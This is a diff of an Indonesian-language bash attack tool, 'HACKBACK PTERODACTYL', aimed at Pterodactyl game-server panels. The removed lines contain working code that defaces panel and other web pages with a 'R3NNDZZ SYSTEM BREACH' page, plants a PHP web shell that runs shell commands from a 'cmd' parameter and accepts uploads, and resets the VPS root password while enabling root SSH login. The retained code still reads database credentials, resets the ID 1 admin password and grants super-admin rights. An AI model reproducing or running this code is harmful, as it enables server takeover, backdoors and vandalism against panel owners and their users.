@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# HACKBACK PTERODACTYL - INFO EDITION + DEFACE
-# Fitur: Get Info Panel + Auto Get ID 1 + Reset Password + DEFACE + VPS Action
+# HACKBACK PTERODACTYL - INFO EDITION
+# Fitur: Get Info Panel + Auto Get ID 1 + Reset Password
 # -------------------------------
 
 # Konfigurasi
@@ -43,376 +43,31 @@ CALENDAR="📅"
 FOLDER="📁"
 FILE="📄"
 PASSWORD="🔐"
-SKULL="💀"
-TARGET="🎯"
-BRUTE="⚡"
-DEFACE="🎨"
-VPS="🖥️"
-BACKUP="💾"
-RESTORE="🔄"
-SCAN="🔍"
 
-# ==============================================
-# HTML DEFACE - R3NNDZZ SYSTEM BREACH
-# ==============================================
-HTML_DEFACE='<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title> R3NNDZZ - SYSTEM BREACH </title>
-    <style>
-        :root {
-            --blood: #ff0000;
-            --cyan: #00f2ff;
-            --bg: #000;
-        }
-        
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        
-        body, html {
-            background: var(--bg);
-            color: #fff;
-            font-family: "Courier New", Courier, monospace;
-            overflow: hidden;
-            height: 100%;
-            width: 100%;
-        }
-        
-        #warning-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 10000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 20px;
-            transition: opacity 1.5s;
-        }
-
-        .warning-text {
-            color: var(--blood);
-            font-size: clamp(1rem, 4vw, 1.5rem);
-            font-weight: bold;
-            line-height: 1.6;
-            text-shadow: 0 0 8px red;
-            letter-spacing: 2px;
-            white-space: pre-line;
-        }
-
-        .blink {
-            animation: blinker 0.8s infinite;
-            color: white;
-            margin-top: 30px;
-            font-size: 1.2rem;
-            border: 1px solid red;
-            padding: 10px 20px;
-            background: rgba(0,0,0,0.7);
-        }
-        
-        @keyframes blinker { 
-            0% { opacity: 1; } 
-            50% { opacity: 0; background: red; color: black; } 
-        }
-
-        #main-ui {
-            opacity: 0;
-            transition: 1.5s ease-in-out;
-            display: none;
-            width: 100%;
-            height: 100%;
-        }
-        
-        canvas { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            z-index: -1; 
-        }
-
-        .container { 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            width: 100%; 
-            padding: 15px; 
-        }
-        
-        .box {
-            background: rgba(0,0,0,0.9);
-            padding: 30px 20px;
-            border: 2px solid var(--blood);
-            box-shadow: 0 0 50px rgba(255,0,0,0.6);
-            text-align: center; 
-            width: 100%; 
-            max-width: 450px; 
-            position: relative;
-            clip-path: polygon(0 0, 95% 0, 100% 5%, 100% 100%, 5% 100%, 0 95%);
-            backdrop-filter: blur(2px);
-        }
-
-        .title { 
-            font-size: clamp(2.5rem, 15vw, 5rem); 
-            font-weight: 900; 
-            letter-spacing: 10px; 
-            margin: 0; 
-            color: var(--blood);
-            text-shadow: 0 0 20px red;
-            line-height: 1.2;
-        }
-
-        .scary-msg { 
-            color: #ffaaaa; 
-            font-size: 1rem; 
-            margin: 20px 0; 
-            min-height: 50px; 
-            font-style: italic; 
-            border-top: 1px dashed red;
-            border-bottom: 1px dashed red;
-            padding: 15px 0;
-        }
-
-        .status-info {
-            background: rgba(20, 0, 0, 0.95);
-            padding: 15px;
-            border-left: 4px solid var(--blood);
-            text-align: left; 
-            font-size: 0.8rem; 
-            line-height: 1.8; 
-            color: #0f0; 
-            margin-bottom: 25px;
-        }
-
-        .footer-links { 
-            display: flex; 
-            flex-direction: column; 
-            gap: 12px; 
-        }
-        
-        .btn-elite {
-            text-decoration: none; 
-            color: white; 
-            border: 2px solid var(--blood);
-            padding: 14px; 
-            font-weight: bold; 
-            font-size: 0.9rem;
-            background: rgba(255,0,0,0.1); 
-            transition: 0.2s; 
-            letter-spacing: 2px;
-            width: 100%; 
-            display: block;
-            text-transform: uppercase;
-            cursor: pointer;
-        }
-        
-        .btn-elite:hover, .btn-elite:active { 
-            background: var(--blood); 
-            color: #000; 
-            box-shadow: 0 0 30px red;
-            transform: scale(1.02);
-        }
-
-        .crt::before {
-            content: " ";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(255,0,0,0.03) 2px, transparent 3px);
-            pointer-events: none;
-            z-index: 1000;
-            animation: scanline 8s linear infinite;
-        }
-
-        @keyframes scanline {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(100%); }
-        }
-
-        .red-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255,0,0,0.02);
-            pointer-events: none;
-            z-index: 999;
-        }
-    </style>
-</head>
-<body class="crt">
-    <div class="red-overlay"></div>
-
-    <div id="warning-screen" onclick="startSystem()">
-        <div class="warning-text" id="initial-msg"></div>
-        <div id="click-prompt" style="display: none;" class="blink">[ TAP TO EXECUTE PROTOCOL ]</div>
-    </div>
-
-    <div id="main-ui">
-        <canvas id="matrix"></canvas>
-        <div class="container">
-            <div class="box">
-                <h1 class="title">R3NNDZZ</h1>
-                <div class="scary-msg" id="final-quotes"></div>
-                <div class="status-info">
-                    [>] STATUS: HIJACKED BY R3NNDZZ<br>
-                    [>] ENTITY: DARK CONSUMER<br>
-                    [>] LOG: SYSTEM FAILURE<br>
-                </div>
-                <div class="footer-links">
-                    <button id="playButton" class="btn-elite">[ SYSTEM BREACHED ]</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <audio id="sfx-bg" loop preload="auto">
-        <source src="https://files.catbox.moe/ek406d.mp3" type="audio/mpeg">
-    </audio>
-    
-    <script>
-        const warningText = "⚠️ SYSTEM BREACH DETECTED ⚠️\\nR3NNDZZ MENGAWASI...\\nDATA ANDA TIDAK AMAN...";
-        let charIdx = 0;
-        let systemStarted = false;
-
-        function typeWarning() {
-            if (charIdx < warningText.length) {
-                document.getElementById("initial-msg").innerHTML += warningText.charAt(charIdx);
-                charIdx++;
-                setTimeout(typeWarning, 50);
-            } else {
-                document.getElementById("click-prompt").style.display = "block";
-            }
-        }
-
-        window.onload = function() {
-            typeWarning();
-            document.getElementById("sfx-bg").load();
-        };
-
-        function startSystem() {
-            if (systemStarted) return;
-            systemStarted = true;
-            
-            document.getElementById("warning-screen").style.opacity = "0";
-            
-            setTimeout(() => {
-                document.getElementById("warning-screen").style.display = "none";
-                document.getElementById("main-ui").style.display = "block";
-                setTimeout(() => { 
-                    document.getElementById("main-ui").style.opacity = "1"; 
-                }, 50);
-                
-                startMatrix();
-                typeFinalQuotes();
-                
-                // Play music
-                let bg = document.getElementById("sfx-bg");
-                bg.volume = 0.5;
-                bg.play();
-            }, 1500);
-        }
-
-        const quotes = [
-            "⚡ R3NNDZZ IS WATCHING ⚡",
-            "💀 YOUR DATA IS OURS 💀",
-            "🔥 SYSTEM COMPROMISED 🔥"
-        ];
-
-        let qIdx = 0;
-        function typeFinalQuotes() {
-            let text = quotes[qIdx];
-            let i = 0;
-            const target = document.getElementById("final-quotes");
-            target.innerHTML = "";
-            
-            let timer = setInterval(() => {
-                if (i < text.length) {
-                    target.innerHTML += text[i];
-                    i++;
-                } else {
-                    clearInterval(timer);
-                    qIdx = (qIdx + 1) % quotes.length;
-                    setTimeout(typeFinalQuotes, 3000);
-                }
-            }, 70);
-        }
-
-        function startMatrix() {
-            const c = document.getElementById("matrix");
-            const ctx = c.getContext("2d");
-            
-            function resizeCanvas() {
-                c.width = window.innerWidth;
-                c.height = window.innerHeight;
-            }
-            
-            resizeCanvas();
-            window.addEventListener("resize", resizeCanvas);
-            
-            const chars = "R3NNDZZ01死23456789破壊";
-            const fontSize = 16;
-            const columns = Math.floor(c.width / fontSize);
-            const drops = new Array(columns).fill(1);
-            
-            function draw() {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
-                ctx.fillRect(0, 0, c.width, c.height);
-                
-                for (let i = 0; i < drops.length; i++) {
-                    const char = chars[Math.floor(Math.random() * chars.length)];
-                    ctx.fillStyle = Math.random() > 0.95 ? "#ffffff" : "#ff0000";
-                    ctx.font = `bold ${fontSize}px "Courier New", monospace`;
-                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
-                    
-                    if (drops[i] * fontSize > c.height && Math.random() > 0.98) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }
-            setInterval(draw, 35);
-        }
-
-        document.getElementById("playButton").addEventListener("click", function(e) {
-            e.stopPropagation();
-            alert("🔴 SYSTEM BREACHED BY R3NNDZZ");
-        });
-    </script>
-</body>
-</html>'
-
-# ==============================================
-# HEADER
-# ==============================================
+# Header
 show_header() {
     clear
     echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
     echo -e "${CYAN}║${WHITE}                                                                              ${CYAN}║${NC}"
-    echo -e "${CYAN}║${WHITE}              ${FIRE} HACKBACK PTERODACTYL - ULTIMATE EDITION ${FIRE}                ${CYAN}║${NC}"
-    echo -e "${CYAN}║${WHITE}              ${GLOBE} GET INFO + RESET PW + DEFACE + VPS ACTION ${GLOBE}          ${CYAN}║${NC}"
-    echo -e "${CYAN}║${WHITE}                         *Ultimate Hacking Tool*                                  ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}              ${FIRE} HACKBACK PTERODACTYL - INFO EDITION ${FIRE}                      ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}              ${GLOBE} GET INFO PANEL + AUTO ID 1 + RESET PASSWORD ${GLOBE}                              ${CYAN}║${NC}"
+    echo -e "${CYAN}║${WHITE}                         *Information Gathering Edition*                              ${CYAN}║${NC}"
     echo -e "${CYAN}║${WHITE}                                                                              ${CYAN}║${NC}"
     echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
 
+# Fungsi untuk hash password menggunakan bcrypt (sesuai Laravel)
+hash_password() {
+    local password="$1"
+    # Menggunakan PHP untuk generate bcrypt hash (sesuai Laravel)
+    php -r "echo password_hash('$password', PASSWORD_BCRYPT);" 2>/dev/null
+}
+
 # ==============================================
 # FUNGSI GET INFO PANEL
 # ==============================================
+
 get_panel_info() {
     echo -e "\n${YELLOW}${GEAR} Mengumpulkan informasi panel...${NC}"
     echo -e "${YELLOW}────────────────────────────────────────────────${NC}"
@@ -730,256 +385,30 @@ reset_password_id1() {
 }
 
 # ==============================================
-# FUNGSI DEFACE PANEL PTERODACTYL (MENU 9)
+# MAIN MENU
 # ==============================================
-deface_panel() {
-    echo -e "\n${RED}${SKULL} ====== DEFACE PANEL PTERODACTYL ====== ${SKULL}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    echo -e "${YELLOW}${WARNING} PERINGATAN: Fitur ini akan mengubah tampilan panel Pterodactyl!${NC}"
-    echo -e "${YELLOW}Pastikan Anda memiliki akses root ke server ini.${NC}\n"
-    
-    # Cek apakah user root
-    if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
-        return 1
-    fi
-    
-    # Tampilkan pilihan metode deface
-    echo -e "${CYAN}Pilih metode deface:${NC}"
-    echo -e "  ${GREEN}[1]${NC} Deface dengan HTML R3NNDZZ (default)"
-    echo -e "  ${GREEN}[2]${NC} Deface dengan custom HTML (input manual)"
-    echo -e "  ${GREEN}[3]${NC} Deface semua halaman error (403,404,500)"
-    echo -e "  ${GREEN}[4]${NC} Deface + Install backdoor"
-    echo -e "  ${GREEN}[5]${NC} Restore backup (kembalikan ke aslinya)"
+show_menu() {
     echo ""
-    echo -ne "${YELLOW}Pilih [1-5] (default: 1): ${NC}"
-    read DEFACE_CHOICE
-    DEFACE_CHOICE=${DEFACE_CHOICE:-1}
-    
-    # Simpan HTML ke file sementara
-    TEMP_HTML="/tmp/deface_$$.html"
-    
-    case $DEFACE_CHOICE in
-        1)
-            echo -e "${GREEN}${CHECK} Menggunakan HTML R3NNDZZ default${NC}"
-            echo "$HTML_DEFACE" > "$TEMP_HTML"
-            ;;
-        2)
-            echo -e "${YELLOW}Silakan paste custom HTML Anda (tekan Ctrl+D untuk selesai):${NC}"
-            cat > "$TEMP_HTML"
-            echo -e "${GREEN}${CHECK} Custom HTML disimpan${NC}"
-            ;;
-        3)
-            echo -e "${GREEN}${CHECK} Akan mendeface semua halaman error${NC}"
-            echo "$HTML_DEFACE" > "$TEMP_HTML"
-            ;;
-        4)
-            echo -e "${GREEN}${CHECK} Deface + Install backdoor${NC}"
-            echo "$HTML_DEFACE" > "$TEMP_HTML"
-            
-            # Buat backdoor sederhana
-            BACKDOOR='<?php
-            // R3NNDZZ Backdoor
-            if(isset($_GET["cmd"])) {
-                echo "<pre>".shell_exec($_GET["cmd"])."</pre>";
-            }
-            if(isset($_GET["upload"])) {
-                move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
-                echo "Uploaded!";
-            }
-            ?>'
-            ;;
-        5)
-            echo -e "${YELLOW}${GEAR} Mencari file backup...${NC}"
-            if [ -d "$PTERO_DIR" ]; then
-                find "$PTERO_DIR" -name "*.bak" -o -name "*.backup" 2>/dev/null | while read backup; do
-                    original=$(echo "$backup" | sed 's/\.bak$//' | sed 's/\.backup$//')
-                    if [ -f "$original" ]; then
-                        cp "$backup" "$original"
-                        echo -e "${GREEN}  ✅ Restored: $original${NC}"
-                    fi
-                done
-                echo -e "${GREEN}${CHECK} Restore selesai!${NC}"
-            else
-                echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan!${NC}"
-            fi
-            rm -f "$TEMP_HTML" 2>/dev/null
-            return 0
-            ;;
-        *)
-            echo -e "${RED}Pilihan tidak valid!${NC}"
-            rm -f "$TEMP_HTML" 2>/dev/null
-            return 1
-            ;;
-    esac
-    
-    # Cek direktori Pterodactyl
-    if [ ! -d "$PTERO_DIR" ]; then
-        echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan di $PTERO_DIR${NC}"
-        echo -e "${YELLOW}Mencari di lokasi alternatif...${NC}"
-        
-        # Cari di lokasi umum
-        ALTERNATIF_LOCATIONS=(
-            "/var/www/pterodactyl"
-            "/var/www/html/pterodactyl"
-            "/home/pterodactyl"
-            "/opt/pterodactyl"
-            "/usr/local/pterodactyl"
-        )
-        
-        for loc in "${ALTERNATIF_LOCATIONS[@]}"; do
-            if [ -d "$loc" ]; then
-                PTERO_DIR="$loc"
-                ENV_FILE="$PTERO_DIR/.env"
-                echo -e "${GREEN}${CHECK} Ditemukan di: $PTERO_DIR${NC}"
-                break
-            fi
-        done
-        
-        if [ ! -d "$PTERO_DIR" ]; then
-            echo -e "${RED}${CROSS} Tidak dapat menemukan instalasi Pterodactyl!${NC}"
-            rm -f "$TEMP_HTML" 2>/dev/null
-            return 1
-        fi
-    fi
-    
-    echo -e "\n${YELLOW}${GEAR} Memulai proses deface...${NC}"
-    
-    # Backup file asli
-    BACKUP_DIR="$PTERO_DIR/backup_$(date +%Y%m%d_%H%M%S)"
-    mkdir -p "$BACKUP_DIR"
-    echo -e "${GREEN}${BACKUP} Backup dibuat di: $BACKUP_DIR${NC}"
-    
-    # ==========================================
-    # DEFACE FILE-FILE PENTING
-    # ==========================================
-    
-    # 1. Public index
-    if [ -f "$PTERO_DIR/public/index.html" ] || [ -f "$PTERO_DIR/public/index.php" ]; then
-        cp "$PTERO_DIR/public/index."* "$BACKUP_DIR/" 2>/dev/null
-        cp "$TEMP_HTML" "$PTERO_DIR/public/index.html"
-        echo -e "${GREEN}  ✅ Public index.html diganti${NC}"
-    fi
-    
-    # 2. Views template
-    VIEWS_DIR="$PTERO_DIR/resources/views/templates"
-    if [ -d "$VIEWS_DIR" ]; then
-        cp "$VIEWS_DIR/"*.blade.php "$BACKUP_DIR/" 2>/dev/null
-        for file in "$VIEWS_DIR"/*.blade.php; do
-            if [ -f "$file" ]; then
-                cp "$TEMP_HTML" "$file"
-            fi
-        done
-        echo -e "${GREEN}  ✅ Template views diganti${NC}"
-    fi
-    
-    # 3. Halaman error (jika dipilih)
-    if [ "$DEFACE_CHOICE" == "3" ] || [ "$DEFACE_CHOICE" == "4" ] || [ "$DEFACE_CHOICE" == "1" ]; then
-        ERRORS_DIR="$PTERO_DIR/public/errors"
-        if [ -d "$ERRORS_DIR" ]; then
-            cp "$ERRORS_DIR/"*.html "$BACKUP_DIR/" 2>/dev/null
-            for error in 403 404 500 503; do
-                if [ -f "$ERRORS_DIR/$error.html" ]; then
-                    cp "$TEMP_HTML" "$ERRORS_DIR/$error.html"
-                fi
-            done
-            echo -e "${GREEN}  ✅ Halaman error diganti${NC}"
-        fi
-    fi
-    
-    # 4. Auth pages
-    AUTH_DIR="$PTERO_DIR/resources/views/auth"
-    if [ -d "$AUTH_DIR" ]; then
-        cp "$AUTH_DIR/"*.blade.php "$BACKUP_DIR/" 2>/dev/null
-        cp "$TEMP_HTML" "$AUTH_DIR/login.blade.php" 2>/dev/null
-        cp "$TEMP_HTML" "$AUTH_DIR/register.blade.php" 2>/dev/null
-        echo -e "${GREEN}  ✅ Halaman auth diganti${NC}"
-    fi
-    
-    # 5. Install backdoor (jika dipilih)
-    if [ "$DEFACE_CHOICE" == "4" ]; then
-        BACKDOOR_FILE="$PTERO_DIR/public/r3nndzz.php"
-        echo "$BACKDOOR" > "$BACKDOOR_FILE"
-        chmod 755 "$BACKDOOR_FILE"
-        echo -e "${GREEN}  ✅ Backdoor terinstall di: $BACKDOOR_FILE${NC}"
-        
-        # Backdoor tersembunyi
-        HIDDEN_BACKDOOR="/tmp/.system_update.php"
-        echo "$BACKDOOR" > "$HIDDEN_BACKDOOR"
-        echo -e "${GREEN}  ✅ Backdoor tersembunyi di: $HIDDEN_BACKDOOR${NC}"
-    fi
-    
-    # 6. Coba cari lokasi website lain
-    echo -e "\n${YELLOW}${SCAN} Mencari website lain di server...${NC}"
-    WEB_ROOTS=(
-        "/var/www/html"
-        "/var/www"
-        "/home/*/public_html"
-        "/usr/local/www"
-        "/opt/lampp/htdocs"
-    )
-    
-    FOUND=0
-    for root in "${WEB_ROOTS[@]}"; do
-        eval "for dir in $root; do
-            if [ -d \"\$dir\" ] && [ \"\$dir\" != \"$PTERO_DIR\" ]; then
-                if [ -f \"\$dir/index.html\" ] || [ -f \"\$dir/index.php\" ]; then
-                    cp \"$TEMP_HTML\" \"\$dir/index.html\" 2>/dev/null
-                    echo -e \"${GREEN}    ✅ Deface: \$dir/index.html${NC}\"
-                    ((FOUND++))
-                fi
-            fi
-        done" 2>/dev/null
-    done
-    
-    if [ $FOUND -gt 0 ]; then
-        echo -e "${GREEN}  ✅ Berhasil mendeface $FOUND website tambahan${NC}"
-    fi
-    
-    # ==========================================
-    # SELESAI
-    # ==========================================
-    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║         ✅ DEFACE PANEL BERHASIL!                             ║${NC}"
-    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════╣${NC}"
-    echo -e "${GREEN}║${NC}  ${GLOBE} URL Panel: ${CYAN}$URL_PANEL${NC}"
-    echo -e "${GREEN}║${NC}  ${FOLDER} Backup: ${YELLOW}$BACKUP_DIR${NC}"
-    
-    if [ "$DEFACE_CHOICE" == "4" ]; then
-        echo -e "${GREEN}║${NC}  ${KEY} Backdoor: ${CYAN}$PTERO_DIR/public/r3nndzz.php${NC}"
-        echo -e "${GREEN}║${NC}  ${KEY} Hidden: /tmp/.system_update.php${NC}"
-    fi
-    
-    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
-    
-    # Test akses backdoor
-    if [ "$DEFACE_CHOICE" == "4" ] && [ -n "$URL_PANEL" ]; then
-        BACKDOOR_URL="${URL_PANEL}/r3nndzz.php"
-        echo -e "\n${YELLOW}Coba akses backdoor:${NC}"
-        echo -e "  ${CYAN}$BACKDOOR_URL?cmd=id${NC}"
-        echo -e "  ${CYAN}$BACKDOOR_URL?cmd=ls -la${NC}"
-    fi
-    
-    # Bersihkan file sementara
-    rm -f "$TEMP_HTML"
-    
-    # Tanya apakah mau restart service
-    echo -e "\n${YELLOW}Restart service nginx/php untuk menerapkan perubahan? (y/n)${NC}"
-    echo -ne "${CYAN}Pilihan: ${NC}"
-    read RESTART_CHOICE
-    
-    if [[ "$RESTART_CHOICE" == "y" || "$RESTART_CHOICE" == "Y" ]]; then
-        echo -e "${YELLOW}Merestart service...${NC}"
-        systemctl restart nginx 2>/dev/null || service nginx restart 2>/dev/null
-        systemctl restart php8.*-fpm 2>/dev/null || service php8.*-fpm restart 2>/dev/null
-        echo -e "${GREEN}${CHECK} Service direstart${NC}"
-    fi
+    echo -e "${WHITE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${WHITE}║                         PILIHAN MENU                                        ║${NC}"
+    echo -e "${WHITE}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║                                                                            ║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[1]${NC} ${GLOBE} GET INFO PANEL LENGKAP + AUTO ID 1                    ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${CYAN}[2]${NC} ${USER} GET USER INFO (MANUAL)                                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[3]${NC} ${SERVER} GET SERVER INFO                                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${YELLOW}[4]${NC} ${DATABASE} GET DATABASE INFO                                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${BLUE}[5]${NC} ${FILE} SAVE INFO TO FILE                                      ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${RED}[6]${NC} ${CROWN} MAKE ID 1 SUPER ADMIN                                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[7]${NC} ${PASSWORD} RESET PASSWORD ID 1 (NEW: admin)                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${GREEN}[8]${NC} ${FIRE} AUTO GET ID 1 + RESET PASSWORD (ALL IN ONE)           ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${RED}[0]${NC} 🚪 KELUAR                                                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║                                                                            ║${NC}"
+    echo -e "${WHITE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -ne "${YELLOW}➤ Pilih menu [0-8]: ${NC}"
 }
 
-# ==============================================
-# FUNGSI GET USER INFO MANUAL
-# ==============================================
+# Function: Get user info manual
 get_user_manual() {
     echo -ne "${CYAN}Masukkan ID User: ${NC}"
     read user_id
@@ -991,9 +420,7 @@ get_user_manual() {
     fi
 }
 
-# ==============================================
-# FUNGSI GET SERVER INFO
-# ==============================================
+# Function: Get server info
 get_server_info() {
     if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
         echo -e "\n${CYAN}Informasi Server:${NC}"
@@ -1003,9 +430,7 @@ get_server_info() {
     fi
 }
 
-# ==============================================
-# FUNGSI GET DATABASE INFO
-# ==============================================
+# Function: Get database info
 get_database_info() {
     if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
         echo -e "\n${CYAN}Informasi Database:${NC}"
@@ -1022,18 +447,13 @@ get_database_info() {
     fi
 }
 
-# ==============================================
-# FUNGSI SAVE INFO TO FILE
-# ==============================================
+# Function: Save info to file
 save_info_file() {
     get_panel_info > /dev/null 2>&1
     # File sudah dibuat di function get_panel_info
-    echo -e "${GREEN}${CHECK} File info sudah disimpan!${NC}"
 }
 
-# ==============================================
-# FUNGSI MAKE ID 1 SUPER ADMIN
-# ==============================================
+# Function: Make ID 1 super admin
 make_id1_admin() {
     if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
         mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
@@ -1043,9 +463,7 @@ make_id1_admin() {
     fi
 }
 
-# ==============================================
-# FUNGSI AUTO GET ID 1 AND RESET PASSWORD
-# ==============================================
+# Function: Auto get ID 1 and reset password
 auto_get_and_reset() {
     echo -e "\n${GREEN}${FIRE} AUTO GET ID 1 + RESET PASSWORD ${FIRE}${NC}"
     echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -1054,451 +472,7 @@ auto_get_and_reset() {
     reset_password_id1
 }
 
-# ==============================================
-# FUNGSI GANTI PASSWORD VPS (MENU 10)
-# ==============================================
-change_vps_password() {
-    echo -e "\n${RED}${VPS} ====== GANTI PASSWORD VPS ====== ${VPS}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    # Cek root
-    if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
-        return 1
-    fi
-    
-    echo -e "${YELLOW}${WARNING} Fitur ini akan mengubah password root VPS!${NC}\n"
-    
-    echo -ne "${CYAN}Masukkan password baru untuk root: ${NC}"
-    read -s NEW_VPS_PASS
-    echo ""
-    
-    if [ -z "$NEW_VPS_PASS" ]; then
-        echo -e "${RED}${CROSS} Password tidak boleh kosong!${NC}"
-        return 1
-    fi
-    
-    echo -ne "${CYAN}Ulangi password baru: ${NC}"
-    read -s CONFIRM_PASS
-    echo ""
-    
-    if [ "$NEW_VPS_PASS" != "$CONFIRM_PASS" ]; then
-        echo -e "${RED}${CROSS} Password tidak cocok!${NC}"
-        return 1
-    fi
-    
-    echo -e "\n${YELLOW}${GEAR} Mengganti password root...${NC}"
-    
-    # Ganti password root
-    echo "root:$NEW_VPS_PASS" | chpasswd 2>/dev/null
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}${CHECK} Password root berhasil diubah!${NC}"
-        
-        # Enable SSH password login
-        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-        systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
-        
-        IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
-        
-        echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
-        echo -e "${GREEN}║         INFO LOGIN VPS                         ║${NC}"
-        echo -e "${GREEN}╠════════════════════════════════════════════════╣${NC}"
-        echo -e "${GREEN}║${NC}  IP Address: ${CYAN}$IP_VPS${NC}"
-        echo -e "${GREEN}║${NC}  Username  : ${YELLOW}root${NC}"
-        echo -e "${GREEN}║${NC}  Password  : ${RED}$NEW_VPS_PASS${NC}"
-        echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
-        
-        # Simpan ke file
-        echo "VPS Login: root@$IP_VPS | Password: $NEW_VPS_PASS | $(date)" >> vps_passwords.txt
-        echo -e "\n${GREEN}${CHECK} Disimpan di: vps_passwords.txt${NC}"
-    else
-        echo -e "${RED}${CROSS} Gagal mengganti password root!${NC}"
-    fi
-}
-
-# ==============================================
-# FUNGSI SCAN VULNERABILITY (MENU 11)
-# ==============================================
-scan_vulnerability() {
-    echo -e "\n${CYAN}${SCAN} ====== SCAN VULNERABILITY ====== ${SCAN}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    # Scan database
-    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
-        echo -e "\n${YELLOW}🔍 Testing koneksi database...${NC}"
-        if mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "USE $DB_NAME" 2>/dev/null; then
-            echo -e "${GREEN}  ✅ Database connection OK${NC}"
-            
-            # Check for weak passwords
-            echo -e "\n${YELLOW}🔍 Checking for weak passwords...${NC}"
-            WEAK_PASS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT username FROM users WHERE password IN ('admin', 'password', '123456', 'qwerty')" 2>/dev/null)
-            if [ -n "$WEAK_PASS" ]; then
-                echo -e "${RED}  ⚠️ Found users with weak passwords!${NC}"
-                echo "$WEAK_PASS" | while read line; do
-                    echo "     - $line"
-                done
-            else
-                echo -e "${GREEN}  ✅ No weak passwords found${NC}"
-            fi
-            
-            # Check for default admin
-            echo -e "\n${YELLOW}🔍 Checking default admin account...${NC}"
-            ADMIN_CHECK=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, username FROM users WHERE id = 1" 2>/dev/null)
-            if [ -n "$ADMIN_CHECK" ]; then
-                echo -e "${GREEN}  ✅ Admin ID 1 exists${NC}"
-            fi
-        else
-            echo -e "${RED}  ❌ Database connection failed${NC}"
